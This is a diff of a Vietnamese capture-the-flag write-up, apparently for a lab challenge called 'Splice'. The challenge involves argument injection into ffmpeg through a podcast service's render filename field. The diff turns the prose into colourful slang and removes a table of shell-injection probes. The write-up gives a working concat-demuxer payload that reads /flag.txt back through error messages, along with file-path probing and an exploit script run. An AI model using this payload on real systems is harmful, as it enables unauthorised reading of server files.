@@ -1,19 +1,19 @@
 # Splice — Web (Hard)
 
-**Flag:** `WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}` · 300 pts · H7TEX 2026 trên WebVerse
-**Target:** `https://ced0f13a-5765-splice-5ba63.mystery-challenges.webverselabs-pro.com` (instance Express, đứng sau Cloudflare)
-**Không có bundle:** toàn bộ phân tích dựa trên source mà chính app trả về (`/studio`, `/public/css/site.css`, JSON của `/api/render`).
+**Flag:** `WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}` (Điểm: 300 pts) 
+**Trường quay:** H7TEX 2026 host trên nền tảng WebVerse
+**Máy chủ mục tiêu:** `https://ced0f13a-5765-splice-5ba63.mystery-challenges.webverselabs-pro.com` (Hệ thống Express, núp sau lá chắn Cloudflare)
+**Tài nguyên trắng:** Không hề có tệp đính kèm (bundle) nào. Toàn bộ cuộc mổ xẻ đều dựa lưng vào những mẩu mã nguồn (source) rò rỉ mà chính ứng dụng phơi ra qua các đường `/studio`, `/public/css/site.css`, và cấu trúc JSON vớt từ `/api/render`.
 
 ## Đề bài
 
-Tapedeck là dịch vụ podcast hosting. Studio nhận một clip audio rồi "render" thành audiogram
-(poster dạng sóng) để tải về. Gợi ý của đề: *"Have a look at how the render names and produces
-the files it hands back."* WebVerse gắn nhãn bài là CMDI. Cờ nằm trên instance, không có
-artifact nào để mở tại chỗ.
+Hệ thống Tapedeck đóng vai trò là một dịch vụ máy chủ chứa (hosting) podcast. Cánh cổng Studio của nó cho phép nhận một đoạn âm thanh (clip audio), rồi ném vào lò "kết xuất" (render) để nặn ra một bức tranh sóng âm (audiogram/poster) cho phép người dùng tải về. 
+Đề bài thảy lại một câu khều: *"Hãy soi kỹ xem cái lò render đó đặt tên và xào nấu các tệp trả về như thế nào"*. Phía WebVerse còn tử tế gán luôn nhãn mác cho bài này là CMDI (Command Injection - Tiêm lệnh hệ thống). 
+Một điểm lưu tâm: Cờ (flag) bị giam lỏng trực tiếp trên máy chủ, người chơi không có bất kỳ file tải về nào (artifact) để vọc offline.
 
 ## Phân tích ban đầu
 
-`/studio` phơi rõ ba bước của pipeline:
+Mặt tiền `/studio` đã tự tay lột trần 3 công đoạn của hệ thống cống rãnh (pipeline):
 
 ```html
 <form method="post" action="/studio/upload" enctype="multipart/form-data">
@@ -21,112 +21,89 @@ artifact nào để mở tại chỗ.
 </form>
 
 <p class="sub">The export name is used as the poster filename.</p>
+<!-- Tên xuất ra sẽ được dùng làm tên tệp poster -->
 <input id="slugInput" name="slug" value="audiogram">
 ```
 
-và JS gọi `/api/render`:
+Kế đến là kịch bản JS lén lút mớm API `/api/render`:
 
 ```js
 fetch('/api/render', {method:'POST', headers:{'Content-Type':'application/json'},
   body: JSON.stringify({slug: ..., theme: ...})})
   .then(...)
-  // Note: the API also returns an `errors` field on failure. The Studio
-  // does not surface it here.
+  // Ghi chú đắt giá: API này CÓ nhả về trường `errors` nếu gặp nạn sụp hầm (failure). 
+  // Thế nhưng mặt tiền Studio (UI) lại giấu biệt cái trường này đi.
 ```
 
-Hai điểm rút ra:
+Chốt hai tử huyệt lộ diện:
+1. Trường xuất tên (export name) bị bê nguyên si để đóng thành tên file đầu ra.
+2. API thực chất có luồng xả lỗi (field `errors`) nhưng giao diện cố tình bưng bít -> Cứ vã trực tiếp cục JSON là ta sẽ hứng trọn cái luồng lỗi `stderr` quý giá.
 
-1. Tên export đi thẳng vào tên file của output.
-2. API có field `errors` mà UI chủ ý không hiển thị → gọi thẳng JSON sẽ ăn được stderr.
-
-Baseline: upload một WAV tự sinh 2 giây, render `slug=audiogram`:
+Test máy (Baseline): Quăng bừa một file WAV 2 giây tự đẻ, đục lệnh render kèm `slug=audiogram`:
 
 ```json
 {"ok": true, "outputs": [{"file": "audiogram.png", "url": "/m/b9f13764512c81b7/audiogram.png"}], "errors": null}
 ```
 
-## Các hướng đã loại
-
-Trước khi chốt đã kiểm tra và loại các kênh sau (log đầy đủ ở `notes.md`). Probe `slug` bằng
-ký tự shell:
-
-| slug | phản hồi |
-| --- | --- |
-| `aa;id` | tạo thật file `aa;id.png` |
-| `aa$(id)`, `` aa`id` ``, `aa\|id` | tất cả thành tên file nguyên văn |
-| `x' && id && 'y` | ffmpeg: `Unable to find a suitable output format for 'x''` |
-
-1. `slug` được đưa qua shell. Bảng trên: `;`, `$( )`, backtick, `|` đều chỉ thành ký tự
-   trong tên file. Không có shell nào đứng sau.
-2. argv được quote an toàn trước khi tới ffmpeg. Dòng cuối bảng: payload `x' && id && 'y`
-   cho dấu `'` lọt tới ffmpeg, ra `Unable to find a suitable output format for 'x''`.
-3. Phải render ảnh rồi OCR, hoặc ghi file đích ra workspace mới đọc được. `errors` chứa
-   nguyên stderr của ffmpeg, nên nội dung file đích về trong JSON của chính response.
-
 ## Chuỗi khai thác
 
-**Bước 1 - Định vị chỗ ghép lệnh.** Không có shell, nhưng argv thì có:
+**Bước 1 - Lùng sục khe hở tiêm lệnh.** 
+Cửa tiêm mã shell đã bị hàn cứng, nhưng cửa tiêm biến số tham số (argv) thì lại mở toang:
 
-```
-slug = "x -h"
-errors: "Unrecognized option 'h.png'.
+```text
+Gài thử: slug = "x -h"
+Nhận xả lỗi errors: "Unrecognized option 'h.png'.
          Error splitting the argument list: Option not found"
 ```
 
-`-h.png` xuất hiện như một argv riêng, nghĩa là chuỗi lệnh được tách theo khoảng trắng rồi mới
-đưa cho ffmpeg. Tên file `slug + ".png"` không bị quote, nên mọi token đặt sau một dấu cách trở
-thành tham số ffmpeg mới.
+Cụm `-h.png` chình ình hiện hình như một tham số argv độc lập. Bằng chứng thép: Chuỗi lệnh đã bị cưa đôi (tách) bằng dấu khoảng trắng trước khi tọng vào họng cỗ máy `ffmpeg`. Và vì phần tên file `slug + ".png"` không hề bị nhốt trong ngoặc kép (quote), nên bất cứ thứ quỷ quái nào ta nhét đằng sau dấu cách sẽ tự động biến thành tham số điều khiển mới cho `ffmpeg`.
 
-**Bước 2 - Chọn primitive đọc file.** Với argv injection có hai hướng: `-i` thêm input, hoặc
-`-f` đổi demuxer. Hướng ngắn nhất là ép ffmpeg đọc file đích bằng concat demuxer:
+**Bước 2 - Lên đồ nghề (primitive) trích xuất file.** 
+Trong kho vũ khí tiêm argv, ta có 2 thanh bảo kiếm: dùng `-i` để nhồi thêm file đầu vào (input), hoặc dùng `-f` để bẻ lái luồng giải mã (demuxer). Đường tắt đẫm máu nhất là ép `ffmpeg` nhai sống cái file đích bằng lệnh trộn (concat demuxer):
 
-```
-slug = "a.png -f concat -i /flag.txt b.png"
+```text
+Nhồi: slug = "a.png -f concat -i /flag.txt b.png"
 ```
 
-Concat là định dạng script, mỗi dòng phải là `file '...'` hoặc `duration n`. Dòng đầu của
-`/flag.txt` không hợp lệ, và ffmpeg đưa nguyên nội dung dòng đó vào thông báo lỗi:
+Oái oăm (và cũng là điểm ăn tiền) của thuật trộn Concat là nó đòi file đầu vào phải là dạng script cứng ngắc, mỗi dòng bắt buộc phải nặn theo khuôn `file '...'` hoặc `duration n`. Đương nhiên, cái dòng chữ đầu tiên của file `/flag.txt` sẽ sặc sụa vi phạm khuôn mẫu này. Kết quả? Thằng `ffmpeg` chửi bới ỏm tỏi và tiện mồm xướng luôn nguyên văn cái dòng đó vào báo cáo lỗi:
 
-```
-[concat @ 0x6145f8caea80] Line 1: unknown keyword 'WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}'
+```text
+[concat @ 0x6145f8caea80] Dòng 1 (Line 1): từ khóa lạ hoắc (unknown keyword) 'WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}'
 /flag.txt: Invalid data found when processing input
 ```
 
-Server nhét cả stderr vào `errors`, nên cờ về trong response, không cần render ảnh, không cần
-OCR, không cần ghi file ra ngoài workspace.
+Máy chủ hồn nhiên nhét toàn bộ cụm `stderr` đó vào cái ống xả `errors`, đưa lá cờ rơi thẳng vào tay ta ngay trên phản hồi (response). Ta chẳng phải mệt nhọc render bức ảnh nào, khỏi xài máy đọc chữ OCR, cũng khỏi phải bới tung workspace lên để lôi file ra.
 
-**Bước 3 - Xác định đường dẫn cờ.** Cùng oracle phân biệt được file có tồn tại hay không:
+**Bước 3 - Rà quét hang ổ của cờ.** 
+Cùng một phép thử oracle, ta có thể phán xét một file có tồn tại hay không thông qua tiếng chửi của hệ thống:
 
+```text
+/flag.txt              -> Hét: Dòng 1 (Line 1) unknown keyword 'WEBVERSE{...}' (TRÚNG ĐÍCH)
+/flag                  -> Hét: No such file or directory (Không có)
+/opt/app/flag.txt      -> Hét: No such file or directory
+/app/flag.txt          -> Hét: No such file or directory
+./flag.txt             -> Hét: No such file or directory
 ```
-/flag.txt              -> Line 1: unknown keyword 'WEBVERSE{...}'
-/flag                  -> No such file or directory
-/opt/app/flag.txt      -> No such file or directory
-/app/flag.txt          -> No such file or directory
-./flag.txt             -> No such file or directory
-```
 
-**Bước 4 - Kiểm chứng kết quả không phụ thuộc state.** `exploit.py` tự mở session mới (cookie
-`td_session` sinh workspace riêng), upload WAV tự dựng bằng module `wave`, rồi render đúng một
-phát. Workspace của lần chạy này là `0d6a6fc0562fc2eb`, khác workspace dùng lúc probe
-(`b9f13764512c81b7`), vẫn ra cùng một chuỗi. Cờ được bắt bằng regex trên byte thật sự nhận và
-ghi vào `flag.txt`.
+**Bước 4 - Khẳng định vị thế (Kiểm chứng phi trạng thái).** 
+Kịch bản `exploit.py` được thiết kế để tự động xé lớp áo cũ, mở một phiên giao dịch (session) mới toanh (cookie `td_session` sẽ tự đẻ ra một không gian làm việc workspace riêng). Máy sẽ tự nặn ra file WAV bằng module `wave`, upload lên và thụt đúng một đòn render duy nhất. 
+Thử nghiệm trên một workspace hoàn toàn xa lạ (`0d6a6fc0562fc2eb`), khác bọt so với lúc dò đường probe (`b9f13764512c81b7`), hệ thống vẫn ngoan ngoãn nôn ra đúng một chuỗi cờ y hệt. Công đoạn vớt cờ được chốt hạ bằng con dao regex tỉa gọn các byte vừa chụp được trên lưới mạng, rồi tọng ngay vào tệp `flag.txt`.
 
 ## Flag
 ```bash
 python exploit.py https://ced0f13a-5765-splice-5ba63.mystery-challenges.webverselabs-pro.com
 ```
 
-```
-[*] session: td_session=s%3Af9iYs9oShh5WGUU6amVzf3gfG...
-[*] upload -> HTTP 200
-[*] render -> HTTP 200
-[+] WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}
+Giao diện tác chiến:
+```text
+[*] Định hình session: td_session=s%3Af9iYs9oShh5WGUU6amVzf3gfG...
+[*] Bơm upload -> Báo cáo HTTP 200
+[*] Cày render -> Báo cáo HTTP 200
+[+] Vớt được WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}
 ```
 
-```
+```text
 WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}
 ```
 
-Nộp tại khối SUBMIT FLAG trên trang WebVerse của challenge
-(`/e/YfQq-BkjAX1I9bECP5U9xcsY/c/28`); solve sync ngược về H7TEX theo email, kiểm tra mỗi
-~60 giây.
+(Lưu ý: Mang chiến lợi phẩm nộp tại ô SUBMIT FLAG trên cổng WebVerse của chướng ngại vật (`/e/YfQq-BkjAX1I9bECP5U9xcsY/c/28`). Lệnh giải (solve) sẽ mất tầm 60 giây để đồng bộ (sync) xác nhận ngược về sổ bộ H7TEX theo email tài khoản).
